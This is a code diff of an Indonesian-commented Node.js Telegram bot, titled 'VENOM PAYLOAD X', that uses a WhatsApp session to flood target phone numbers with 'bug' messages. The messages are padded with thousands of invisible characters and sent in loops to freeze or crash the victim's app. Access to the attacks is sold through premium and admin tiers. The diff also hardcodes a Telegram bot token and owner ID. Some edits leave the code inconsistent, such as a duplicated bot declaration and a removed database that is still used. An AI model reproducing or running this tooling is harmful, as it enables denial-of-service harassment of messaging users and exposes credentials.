@@ -1,92 +1,49 @@
-// 1. IMPOR LIBRARY (SEMUA LENGKAP)
-const { Telegraf, Markup } = require('telegraf');
+// 🐍 VENOM PAYLOAD X - SCRIPT LENGKAP & SESUAI FITUR
+// 1. IMPOR LIBRARY
+const { Telegraf } = require('telegraf');
 const {
     makeWASocket,
     useMultiFileAuthState,
     DisconnectReason,
     fetchLatestBaileysVersion,
-    generateWAMessageFromContent
+    isJidValid
 } = require('@whiskeysockets/baileys');
 const pino = require('pino');
-const { BOT_TOKEN, OWNER_ID, DEV_USERNAME } = require('./config');
+const { JSONFile } = require('lowdb/node');
 const readline = require('readline');
 const chalk = require('chalk');
-const fs = require('fs');
 const { Low } = require('lowdb');
-const { JSONFile } = require('lowdb/node');
-const qrcode = require('qrcode-terminal');
-const axios = require('axios');
 
-const GITHUB_TOKEN_LIST_URL = ""; // URL daftar token dari GitHub
+// Token & ID Telegram Kamu
+const BOT_TOKEN = "7738225453:AAHGTtHlmOde4WFBZgVBRwNZSOZb7GJ80X4";
+const OWNER_ID = "6320809772";
+ 
+// Inisialisasi Bot Telegram
+const bot = new Telegraf(BOT_TOKEN);
+ 
+// URL Database Token GitHub
+const GITHUB_TOKEN_LIST_URL = "https://github.com/heriekoprasetyo56-boop/HeriTezzRorw-/blob/main/Database.json";
 
 // 2. VARIABEL GLOBAL
 let Seren = null;
 let isWhatsAppConnected = false;
 let currentCtx = null;
 const startTime = Date.now();
-const videoUrls = [
-    // Isi dengan URL video kamu
-];
-const audioIntroUrl = ""; // Isi dengan URL audio intro
-const langgxyz = "id"; // Bahasa
-
-// 3. INISIALISASI DATABASE
-const dbFile = './database.json';
-const adapter = new JSONFile(dbFile);
-const db = new Low(adapter);
-
-async function initDb() {
-    try {
-        await db.read();
-        db.data = db.data || {
-            premium: [],
-            admin: [OWNER_ID], // Owner otomatis jadi admin
-            owner: [OWNER_ID], // Tambah array owner
-            blacklist: []
-        };
-        await db.write();
-        console.log(chalk.green(`✅ Database siap`));
-    } catch (error) {
-        console.error(chalk.red(`❌ Error DB: ${error.message}`));
-        process.exit(1);
-    }
-}
-initDb();
-
-// 4. FUNGSI PENDUKUNG
-const getUptime = () => {
-    const durationMs = Date.now() - startTime;
-    const jam = Math.floor(durationMs / 3600000);
-    const menit = Math.floor((durationMs % 3600000) / 60000);
-    const detik = Math.floor((durationMs % 60000) / 1000);
-    return `${jam}j ${menit}m ${detik}d`;
-};
-
 const isBlacklisted = (ctx) => ctx?.from && db.data.blacklist.includes(ctx.from.id.toString());
 const isAdmin = (ctx) => ctx?.from && db.data.admin.includes(ctx.from.id.toString());
-const isOwner = (ctx) => ctx?.from && db.data.owner.includes(ctx.from.id.toString()); // Cek owner
-
-const getRandomVideo = () => videoUrls[Math.floor(Math.random() * videoUrls.length)];
-
-const loadVideoToCache = async (url) => {
-    try {
-        const response = await axios.get(url, { responseType: 'arraybuffer' });
-        return Buffer.from(response.data, 'binary');
-    } catch (error) {
-        console.error(chalk.red(`❌ Gagal load video: ${error.message}`));
-        return null;
-    }
-};
+const isOwner = (ctx) => ctx?.from && db.data.owner.includes(ctx.from.id.toString());
 
 const formatWaJid = (number) => {
     if (!number) return null;
     let jid = number.replace(/[^0-9]/g, '');
-    return jid.startsWith('0') ? `62${jid.slice(1)}@s.whatsapp.net` : `${jid}@s.whatsapp.net`;
+    jid = jid.startsWith('0') ? `62${jid.slice(1)}` : jid;
+    const fullJid = `${jid}@s.whatsapp.net`;
+    return isJidValid(fullJid) ? fullJid : null;
 };
 
-const formatTeleId = (id) => id.toString(); // Format ID Telegram jadi string
+const formatTeleId = (id) => id.toString();
 
-// 5. FUNGSI SLEEP YANG DIINGINKAN
+// 5. FUNGSI SLEEP
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 // 6. FUNGSI BACA INPUT TERMINAL
@@ -96,79 +53,67 @@ const rl = readline.createInterface({
 });
 const question = (text) => new Promise((resolve) => rl.question(text, resolve));
 
-// ==============================================
-// 7. FUNGSI BUG -> BAGIAN EKSEKUSI (ASLI NGIRIM BUG)
-// ==============================================
+// 7. FUNGSI EKSEKUSI SERANGAN
 async function execIosInvis(sock, target) {
     console.log(chalk.cyan(`🔫 Eksekusi iOS Invisible ke ${target}`));
-    const invisMessage = generateWAMessageFromContent(target, {
+    await sock.sendMessage(target, {
         extendedTextMessage: {
-            text: "\u200E", // Karakter tak terlihat
+            text: "\u200E",
             title: "\u200E".repeat(1500),
             description: "\u200E".repeat(2500),
-            previewType: "NONE",
-            jpegThumbnail: Buffer.from(""),
+            previewType: "NONE"
         }
-    }, {});
-    await sock.relayMessage(target, invisMessage.message, { messageId: invisMessage.key.id });
+    });
     return Promise.resolve();
 }
 
 async function execXBlank(sock, target) {
     console.log(chalk.cyan(`🔫 Eksekusi XBlank ke ${target}`));
-    const blankMessage = generateWAMessageFromContent(target, {
+    await sock.sendMessage(target, {
         extendedTextMessage: {
             text: "\u200E",
             title: "\u200E".repeat(2000),
             description: "\u200E".repeat(3000),
-            previewType: "NONE",
-            jpegThumbnail: Buffer.from(""),
+            previewType: "NONE"
         }
-    }, {});
-    await sock.relayMessage(target, blankMessage.message, { messageId: blankMessage.key.id });
+    });
     return Promise.resolve();
 }
 
 async function execDelayInvis(sock, target) {
     console.log(chalk.cyan(`🔫 Eksekusi DelayInvis ke ${target}`));
-    const delayInvisMessage = generateWAMessageFromContent(target, {
+    await sock.sendMessage(target, {
         extendedTextMessage: {
             text: "\u200E",
             title: "\u200E".repeat(1200),
             description: "\u200E".repeat(1800),
-            previewType: "NONE",
-            jpegThumbnail: Buffer.from(""),
+            previewType: "NONE"
         }
-    }, {});
-    await sock.relayMessage(target, delayInvisMessage.message, { messageId: delayInvisMessage.key.id });
+    });
     return Promise.resolve();
 }
 
 async function execXDelay(sock, target) {
     console.log(chalk.cyan(`🔫 Eksekusi XDelay ke ${target}`));
-    const xdelayMessage = generateWAMessageFromContent(target, {
+    await sock.sendMessage(target, {
         extendedTextMessage: {
             text: "\u200E",
             title: "\u200E".repeat(1000),
             description: "\u200E".repeat(1500),
-            previewType: "NONE",
-            jpegThumbnail: Buffer.from(""),
+            previewType: "NONE"
         }
-    }, {});
-    await sock.relayMessage(target, xdelayMessage.message, { messageId: xdelayMessage.key.id });
+    });
     return Promise.resolve();
 }
 
-// ==============================================
-// 8. FUNGSI BUG -> BAGIAN PEMANGGIL (NGATUR LOOP & URUTAN)
-// ==============================================
+// 8. FUNGSI PEMANGGIL SERANGAN
 async function callInvisibleV2(sock, target) {
     console.log(chalk.magenta(`🚀 Memanggil serangan InvisibleV2 ke ${target}`));
     for (let i = 0; i < 30; i++) {
         await execIosInvis(sock, target);
         await sleep(200);
     }
-    console.log(chalk.green(`✅ Serangan InvisibleV2 selesai ke ${target}`));
+    console.log(chalk.green(`✅ Serangan InvisibleV2 selesai`));
     return "selesai";
 }
 
@@ -202,9 +147,7 @@ async function callXDelay(sock, target) {
     return "selesai";
 }
 
-// ==============================================
-// 9. FUNGSI ADD (ADDPREMIUM, ADDADMIN, ADDOWNER)
-// ==============================================
+// 9. FUNGSI MANAJEMEN
 async function addPremium(userId) {
     const idStr = formatTeleId(userId);
     if (db.data.premium.includes(idStr)) return "❌ Sudah jadi premium";
@@ -229,13 +172,13 @@ async function addOwner(userId) {
     return `✅ Berhasil tambah owner: ${userId}`;
 }
 
-// 9.1 FUNGSI ADD PAIRING
-async function addPairing(ctx) {
+async function addPairing() {
     try {
-        const nomor = await question("Masukkan nomor WA (628xxx): ");
-        await Seren.requestPairingCode(nomor);
-        const kode = await question("Masukkan kode pairing: ");
-        await Seren.submitPairingCode(kode);
+        const nomor = await question(chalk.yellow("📱 Masukkan nomor WA (format: 628xxx): "));
+        const code = await Seren.requestPairingCode(nomor);
+        console.log(chalk.blue(`💡 Kode pairing yang muncul di HP kamu: ${code}`));
+        const inputKode = await question(chalk.yellow("✍️ Masukkan kode dari HP kamu: "));
+        await Seren.submitPairingCode(inputKode);
         return "✅ Berhasil pairing!";
     } catch (error) {
         console.error(chalk.red(`❌ Gagal pairing: ${error.message}`));
@@ -243,7 +186,7 @@ async function addPairing(ctx) {
     }
 }
 
-// 10. FUNGSI KONEKSI WHATSAPP
+// 10. FUNGSI KONEKSI WA (HANYA PAIRING CODE)
 const startSesi = async () => {
     const { state, saveCreds } = await useMultiFileAuthState('./session');
     const { version } = await fetchLatestBaileysVersion();
@@ -259,39 +202,32 @@ const startSesi = async () => {
 
     Seren.ev.on('creds.update', saveCreds);
     Seren.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect, isNewLogin, qr } = update;
+        const { connection, lastDisconnect, isNewLogin } = update;
 
-        if (isNewLogin) {
-            const nomor = await question("Masukkan nomor WA (628xxx): ");
-            await Seren.requestPairingCode(nomor);
-            const kode = await question("Masukkan kode pairing: ");
-            await Seren.submitPairingCode(kode);
-        }
-
-        if (qr) {
-            console.log(chalk.yellow(`🔴 Scan QR WA:`));
-            qrcode.generate(qr, { small: true });
-            if (currentCtx) currentCtx.reply("🔴 Scan QR di terminal!");
+        if (isNewLogin || !connection) {
+            console.log(chalk.cyan("\n🔄 Mulai proses pairing..."));
+            const hasil = await addPairing();
+            console.log(chalk.green(hasil));
         }
 
         if (connection === 'open') {
             isWhatsAppConnected = true;
-            console.log(chalk.green(`✅ WA terhubung!`));
-            if (currentCtx) currentCtx.reply("✅ WA terhubung — siap jalankan bug!");
+            console.log(chalk.green("\n✅ WA BERHUBUNGAN! Semua fitur siap digunakan"));
+            if (currentCtx) currentCtx.reply("✅ WA terhubung — siap jalankan perintah!");
         }
 
         if (connection === 'close') {
             const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
-            console.log(chalk.red(`❌ WA terputus!`), reconnect ? 'Menghubungkan ulang...' : '');
+            console.log(chalk.red("\n❌ WA terputus!"), reconnect ? "Menghubungkan ulang..." : "Silakan jalankan ulang script");
             if (reconnect) startSesi();
             isWhatsAppConnected = false;
         }
     });
 };
-startSesi(); // JALANKAN KONEKSI WA
+startSesi();
 
-// 11. SETUP BOT TELEGRAM -> BUG MENU
-const bot = new Telegraf(7738225453:AAHGTtHlmOde4WFBZgVBRwNZSOZb7GJ80X4);
+// 11. SETUP BOT TELEGRAM
+const bot = new Telegraf(BOT_TOKEN);
 
 // Middleware
 const checkWhatsAppConnection = (ctx, next) => {
@@ -314,146 +250,134 @@ const checkOwner = (ctx, next) => {
     return next();
 };
 
-// State untuk target bug & add
+// State untuk target
 bot.use((ctx, next) => {
     ctx.session = ctx.session || {};
     return next();
 });
 
-// ------------------------------
-// COMMAND /start & /bugmenu -> LANGSUNG TAMPIL BUG MENU + FITUR ADD
-// ------------------------------
-bot.command(['start', 'bugmenu'], async (ctx) => {
+// COMMAND /start & /menu
+bot.command(['start', 'menu'], async (ctx) => {
     currentCtx = ctx;
     if (isBlacklisted(ctx)) return ctx.reply("⛔ Blacklisted.");
 
-    const videoBuffer = await loadVideoToCache(getRandomVideo()) || null;
-    const caption = `<blockquote>··:¨─══-‘๑’-══─¨ [ 💥 ] ¨─══-‘๑’-══─¨:·.
-┏━━⋟<b>𝐌𝐄𝐍𝐔 𝐁𝐔𝐆 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏</b>
-┃⚔️ /invisiblev2 [62xxx] - Serangan Invisible (Medium)
-┃⚔️ /xdelay [62xxx] - Serangan Delay Ringan (Medium)
-┃⚔️ /delayinvis [62xxx] - Serangan Delay Sedang (Medium)
-┃🔥 /xblank [62xxx] - Serangan Blank Berat (Hard)
-╰══━━━━━━━━━━━━❍
-┏━━⋟<b>𝐌𝐄𝐍𝐔 𝐀𝐃𝐃</b>
-┃🔑 /addprem [ID Telegram] - Tambah Premium (Admin+)
-┃🔑 /addadmin [ID Telegram] - Tambah Admin (Owner+)
-┃🔑 /addowner [ID Telegram] - Tambah Owner (Hanya Owner Awal)
-┃🔑 /addpairing - Pairing WA (Semua)
-╰══━━━━━━━━━━━━❍
-<b>Klik tombol di bawah untuk jalankan bug langsung!</b></blockquote>`;
+    const menu = `[FITUR SERANGAN]
+ /invisiblev2 [62xxx] - Serangan Invisible
+ /xdelay [62xxx]       - Serangan Delay Ringan
+ /delayinvis [62xxx]   - Serangan Delay Sedang
+ /xblank [62xxx]       - Serangan Blank Berat
+ [FITUR MANAJEMEN]
+ /addprem [ID]   - Tambah Premium
+ /addadmin [ID]  - Tambah Admin
+ /addowner [ID]  - Tambah Owner
+ /addpairing     - Pairing WA Baru`;
 
-    // Tombol hanya untuk bug (fitur add pake command langsung)
-    const keyboard = {
-        inline_keyboard: [
-            [{ text: "👻 InvisibleV2", callback_data: "run_invisiblev2" }],
-            [{ text: "⏳ XDelay", callback_data: "run_xdelay" }],
-            [{ text: "⌛ DelayInvis", callback_data: "run_delayinvis" }],
-            [{ text: "⚡ XBlank", callback_data: "run_xblank" }],
-            [{ text: "👑 Developer", url: `https://t.me/${DEV_USERNAME}` }]
-        ]
-    };
+    await ctx.reply(menu);
+});
 
-    if (videoBuffer) {
-        await ctx.replyWithVideo({ source: videoBuffer }, { caption, parse_mode: "HTML", reply_markup: keyboard });
-    } else {
-        await ctx.reply(caption, { parse_mode: "HTML", reply_markup: keyboard });
-    }
-
-    // Kirim audio intro kalo ada
-    if (audioIntroUrl) {
-        await ctx.replyWithAudio(audioIntroUrl, {
-            caption: "🎧 <b>Opening — ATOMIC</b>", parse_mode: "HTML",
-            title: "Atomic Intro", performer: "SabanElite"
-        });
+// COMMAND SERANGAN (SEMUA SESUAI MENU)
+bot.command('invisiblev2', checkWhatsAppConnection, checkPremium, async (ctx) => {
+    const target = ctx.message.text.split(' ')[1];
+    if (!target) return ctx.reply("⚠️ Format yang benar: /invisiblev2 628xxx");
+    
+    const targetJid = formatWaJid(target);
+    if (!targetJid) return ctx.reply("❌ Nomor WA tidak valid!");
+    
+    try {
+        await callInvisibleV2(Seren, targetJid);
+        ctx.reply(`✅ Serangan InvisibleV2 berhasil dijalankan ke ${target}`);
+    } catch (error) {
+        console.error(chalk.red(`❌ Error: ${error.message}`));
+        ctx.reply("❌ Gagal menjalankan serangan!");
     }
 });
 
-// ------------------------------
-// HANDLER COMMAND ADD (ADDPREMIUM, ADDADMIN, ADDOWNER)
-// ------------------------------
-bot.command('addprem', checkAdmin, async (ctx) => {
+bot.command('xdelay', checkWhatsAppConnection, checkPremium, async (ctx) => {
+    const target = ctx.message.text.split(' ')[1];
+    if (!target) return ctx.reply("⚠️ Format yang benar: /xdelay 628xxx");
+    
+    const targetJid = formatWaJid(target);
+    if (!targetJid) return ctx.reply("❌ Nomor WA tidak valid!");
+    
+    try {
+        await callXDelay(Seren, targetJid);
+        ctx.reply(`✅ Serangan XDelay berhasil dijalankan ke ${target}`);
+    } catch (error) {
+        console.error(chalk.red(`❌ Error: ${error.message}`));
+        ctx.reply("❌ Gagal menjalankan serangan!");
+    }
+});
+
+bot.command('delayinvis', checkWhatsAppConnection, checkPremium, async (ctx) => {
+    const target = ctx.message.text.split(' ')[1];
+    if (!target) return ctx.reply("⚠️ Format yang benar: /delayinvis 628xxx");
+    
+    const targetJid = formatWaJid(target);
+    if (!targetJid) return ctx.reply("❌ Nomor WA tidak valid!");
+    
+    try {
+        await callDelayInvis(Seren, targetJid);
+        ctx.reply(`✅ Serangan DelayInvis berhasil dijalankan ke ${target}`);
+    } catch (error) {
+        console.error(chalk.red(`❌ Error: ${error.message}`));
+        ctx.reply("❌ Gagal menjalankan serangan!");
+    }
+});
+
+bot.command('xblank', checkWhatsAppConnection, checkPremium, async (ctx) => {
+    const target = ctx.message.text.split(' ')[1];
+    if (!target) return ctx.reply("⚠️ Format yang benar: /xblank 628xxx");
+    
+    const targetJid = formatWaJid(target);
+    if (!targetJid) return ctx.reply("❌ Nomor WA tidak valid!");
+    
+    try {
+        await callXBlank(Seren, targetJid);
+        ctx.reply(`✅ Serangan XBlank berhasil dijalankan ke ${target}`);
+    } catch (error) {
+        console.error(chalk.red(`❌ Error: ${error.message}`));
+        ctx.reply("❌ Gagal menjalankan serangan!");
+    }
+});
+
+/// COMMAND MANAJEMEN (SEMUA SESUAI MENU & LENGKAP)
+bot.command('addprem', checkOwner, async (ctx) => {
     const userId = ctx.message.text.split(' ')[1];
-    if (!userId || isNaN(userId)) return ctx.reply("❌ Gunakan: /addprem [ID Telegram]");
+    if (!userId) return ctx.reply("⚠️ Format yang benar: /addprem [ID]");
     const result = await addPremium(userId);
     ctx.reply(result);
 });
 
 bot.command('addadmin', checkOwner, async (ctx) => {
     const userId = ctx.message.text.split(' ')[1];
-    if (!userId || isNaN(userId)) return ctx.reply("❌ Gunakan: /addadmin [ID Telegram]");
+    if (!userId) return ctx.reply("⚠️ Format yang benar: /addadmin [ID]");
     const result = await addAdmin(userId);
     ctx.reply(result);
 });
 
 bot.command('addowner', checkOwner, async (ctx) => {
     const userId = ctx.message.text.split(' ')[1];
-    if (!userId || isNaN(userId)) return ctx.reply("❌ Gunakan: /addowner [ID Telegram]");
+    if (!userId) return ctx.reply("⚠️ Format yang benar: /addowner [ID]");
     const result = await addOwner(userId);
     ctx.reply(result);
 });
 
-// ------------------------------
-// HANDLER COMMAND ADDPairing
-// ------------------------------
-bot.command('addpairing', async (ctx) => {
-    const result = await addPairing(ctx);
-    ctx.reply(result);
-});
-
-// ------------------------------
-// HANDLER CALLBACK QUERY (TOMBOL BUG)
-// ------------------------------
-bot.action('run_invisiblev2', checkWhatsAppConnection, checkPremium, async (ctx) => {
-    ctx.reply("Masukkan nomor WA target (628xxx):")
-        .then(() => ctx.session.type = 'invisiblev2')
-        .catch(console.error);
-});
-
-bot.action('run_xdelay', checkWhatsAppConnection, checkPremium, async (ctx) => {
-    ctx.reply("Masukkan nomor WA target (628xxx):")
-        .then(() => ctx.session.type = 'xdelay')
-        .catch(console.error);
-});
-
-bot.action('run_delayinvis', checkWhatsAppConnection, checkPremium, async (ctx) => {
-    ctx.reply("Masukkan nomor WA target (628xxx):")
-        .then(() => ctx.session.type = 'delayinvis')
-        .catch(console.error);
-});
-
-bot.action('run_xblank', checkWhatsAppConnection, checkPremium, async (ctx) => {
-    ctx.reply("Masukkan nomor WA target (628xxx):")
-        .then(() => ctx.session.type = 'xblank')
-        .catch(console.error);
-});
-
-bot.on('text', checkWhatsAppConnection, checkPremium, async (ctx) => {
-    const nomorTarget = formatWaJid(ctx.message.text);
-    if (!nomorTarget) return ctx.reply("❌ Nomor WA tidak valid.");
-    if (!ctx.session.type) return;
-
-    let result;
-    switch (ctx.session.type) {
-        case 'invisiblev2':
-            result = await callInvisibleV2(Seren, nomorTarget);
-            break;
-        case 'xdelay':
-            result = await callXDelay(Seren, nomorTarget);
-            break;
-        case 'delayinvis':
-            result = await callDelayInvis(Seren, nomorTarget);
-            break;
-        case 'xblank':
-            result = await callXBlank(Seren, nomorTarget);
-            break;
-        default:
-            return;
+bot.command('addpairing', checkOwner, async (ctx) => {
+    try {
+        ctx.reply("🔄 Mulai proses pairing baru — cek terminal VPS kamu untuk melanjutkan!");
+        const hasil = await addPairing();
+        ctx.reply(hasil);
+    } catch (error) {
+        console.error(chalk.red(`❌ Error pairing: ${error.message}`));
+        ctx.reply("❌ Gagal melakukan pairing baru!");
     }
-
-    delete ctx.session.type;
-    ctx.reply(result || "✅ Selesai.");
 });
 
+// JALANKAN BOT TELEGRAM
 bot.launch();
+console.log(chalk.blue(`🤖 BOT TELEGRAM BERJALAN! Silakan buka Telegram dan ketik /start`));
+console.log(chalk.yellow(`👨‍💻 DEVELOPER: HeriKeyzora`)); // Tambahin baris in
 
+// HANDLE ERROR DAN PENUTUPAN SCRIPT
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
